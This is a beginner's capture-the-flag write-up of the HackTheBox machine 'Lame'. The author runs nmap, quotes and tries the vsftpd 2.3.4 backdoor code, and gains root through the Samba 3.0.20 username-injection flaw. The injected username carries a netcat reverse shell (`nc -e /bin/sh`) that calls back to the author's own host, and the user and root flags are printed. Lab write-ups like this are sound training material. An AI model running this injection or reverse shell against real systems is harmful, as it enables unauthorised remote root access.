# Lame

Hello and welcome to my first ever pentest report! Today we are conquering HackTheBox's easy machine "Lame".

I've gone ahead and booted up my Kali virtual machine, and I have connected to the HackTheBox VPN network. After starting up the box on their website, I get the IP address `10.10.10.3`.

## Getting Started

Let's get going with a port scan using `nmap`:

```
$ sudo nmap -sV -sC 10.10.10.3

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 20:09 CET
Nmap scan report for 10.10.10.3
Host is up (0.0058s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h30m21s, deviation: 3h32m11s, median: 18s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-12-10T14:10:27-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.44 seconds
```

Let's summarize `nmap`'s findings:

- There is an FTP server on (the usual) port 21, allowing anonymous login
- SSH is running as normal on port 22
- A SMB server (`smbd`) is running on both port 139 and port 445.
  - Port 445 is for modern SMB traffic over TCP
  - Port 139 is for legacy Windows computers using [NetBIOS](https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP).

I usually start with FTP, especially since we can use anonymous login, because we will need some form of credentials to enumerate the other ports.

```
$ ftp anonymous@10.10.10.3

Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
229 Entering Extended Passive Mode (|||7674|).
150 Here comes the directory listing.
226 Directory send OK.
```

As you can see, we are able to log in as `anonymous` without providing any password (just press ENTER), but when we request a directory listing it appears there are no files on the FTP server at all! That is quite strange, and makes me think there must be something else about this FTP server that we can use. Let's take a look at the version again, as reported by `nmap`:

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
```

When looking up `vsftpd 2.3.4 vulnerability` online, we quickly discover that this version
[contained a backdoor](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)! More specifically, a distribution server for `vsftpd` was compromised and the distribution code altered with a backdoor for some period of time.

## A backdoor?!

Yeah, really. Let's take a look at the modifications that were made to `vsftpd` to see if we can exploit this:

```c
// ...

else if((p_str->p_buf[i]==0x3a) && (p_str->p_buf[i+1]==0x29))
{
    vsf_sysutil_extra();
}

// ...
```

What is this code doing? Well, its looking through the username string, looking for two characters: `0x3a` and `0x29`, which represent `:` and `)` respectively. That is to say, it's looking for a smiley face `:)` in the username!

If it finds a smiley face, it calls `vsf_sysutil_extra()`:

```c
int
vsf_sysutil_extra(void)
{
  int fd, rfd;
  struct sockaddr_in sa;
  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
  exit(1);
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_port = htons(6200);
  sa.sin_addr.s_addr = INADDR_ANY;
  if((bind(fd,(struct sockaddr *)&sa,
  sizeof(struct sockaddr))) < 0) exit(1);
  if((listen(fd, 100)) == -1) exit(1);
  for(;;)
  {
    rfd = accept(fd, 0, 0);
    close(0); close(1); close(2);
    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
    execl("/bin/sh","sh",(char *)0);
  }
}
```

It opens a TCP socket on port `6200` and spawns a `/bin/sh` shell for incoming connections :)

This looks like something we can easily exploit:

```
$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): hello:)world
331 Please specify the password.
Password:
ftp: Login failed
ftp> quit
```

Now we try to connect to port 6200:

```
nc 10.10.10.3 6200
```

And we get... nothing! Unfortunately this exploit does not seem to work on this box. After attempting several times I am unable to get a shell to appear in netcat.

### Metasploit to the rescue??

I also attempted to use the Metaploit framework to perform the exploit, and it still did not work, but it at least confirmed that I did not make a mistake:

```
$ msfconsole
Metasploit tip: The use command supports fuzzy searching to try and
select the intended module, e.g. use kerberos/get_ticket or use
kerberos forge silver ticket

                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v6.4.38-dev                          ]
+ -- --=[ 2466 exploits - 1273 auxiliary - 393 post       ]
+ -- --=[ 1475 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.3
rhosts => 10.10.10.3

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact
payload => cmd/unix/interact

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   10.10.10.3       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

Let's move on!

## Samba 🎶

Next we'll take a peek at the SMB server running on ports `139/tcp` and `445/tcp`

```
$ smbclient -L //10.10.10.3/
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))

Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
```

There are five shares, but which ones can we access without login? `smbmap` to the rescue!

```
$ smbmap -H 10.10.10.3

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 10.10.10.3:445  Name: 10.10.10.3                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
[*] Closed 1 connection
```

Its just `tmp` we can read, and write! Let's try to access this share, adding the flag `-N` for "no password":

```
$ smbclient -N //10.10.10.3/tmp

Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Dec 10 21:10:08 2024
  ..                                 DR        0  Sat Oct 31 08:33:58 2020
  .ICE-unix                          DH        0  Tue Dec 10 20:08:29 2024
  5571.jsvc_up                        R        0  Tue Dec 10 20:09:31 2024
  vmware-root                        DR        0  Tue Dec 10 20:08:37 2024
  .X11-unix                          DH        0  Tue Dec 10 20:08:55 2024
  .X0-lock                           HR       11  Tue Dec 10 20:08:55 2024
  vgauthsvclog.txt.0                  R     1600  Tue Dec 10 20:08:27 2024

                7282168 blocks of size 1024. 5386496 blocks available
smb: \> exit
```

There isn't anything interesting here, it seems like a bunch of temporary files that I would expect in `/tmp`. Let's again, look up the version of this service:

```
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

We can use `searchsploit` to look up this version faster than I can Google:

```
$ searchsploit samba 3.0
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                 | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                               | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)     | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                   | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)               | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)             | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                             | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                    | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                     | linux/remote/364.pl
Samba < 3.0.20 - Remote Heap Overflow                                                | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                        | linux_x86/dos/36741.py
------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We'll pick the third one on the list, as it is the most specific to our version (`3.0.20`). [Looking up the CVE](https://nvd.nist.gov/vuln/detail/CVE-2007-2447), we can exploit a vulnerability in, again, the username. If we provide a username `` `id` `` between backticks like that, the command `id` will be executed just like it would on the Linux command line (where we often use `$()` for this). The exploit uses `nohup` to allow the command to run for longer than the SMB session. Let's try it!

```
$ nc -lvnp 4444

---> SWITCH TO NEW TAB

$ smbclient //10.10.10.3/tmp -U './=`nohup nc -e /bin/sh 10.10.14.8 4444`'
Password for [=`NOHUP NC -E \bin/sh 10.10.14.8 4444`]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

We use `nohup` to run a `nc` netcat connection with the flag `-e`:

```
-e filename  specify filename to exec after connect
```

Our value is `/bin/sh` which is a basic shell.

Lastly we provide the IP address of our attacker machine on which the listener is running: `10.10.14.8`, and the port on which the listener is listening: `4444`.

Weirdly enough my command seems to be getting uppercased, so this is not going to work. Let's try alternative authentication. We can change users once authenticated:

```
$ smbclient //10.10.10.3/tmp
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.8 4444`"
Password:
```

If we then go check on my other tab where I have my listener running

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 59663
```

We seem to have a connection, let's run a command to see if we have a shell:

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 59663
id
uid=0(root) gid=0(root)
```

We can use Python (if installed) to upgrade this shell by spawning Bash:

```
python -c 'import pty; pty.spawn("bash")'
root@lame:/#
```

That worked! We now have a nice shell as `root`! We jumped straight from nothing to being able to claim both the user and root flag:

```
root@lame:/# ls /home
ftp  makis  service  user

root@lame:/# cd /home/makis

root@lame:/home/makis# ls
user.txt

root@lame:/home/makis# cat user.txt
6a1abab17b9b3cdfdf22364e4db95b85

root@lame:/home/makis# cd /root

root@lame:/root# cat root.txt
81d0f4a72f55e73718ccb82e8ebc7d0c
```

And that wraps up my first post! Thank you so much for reading, and see you next time!
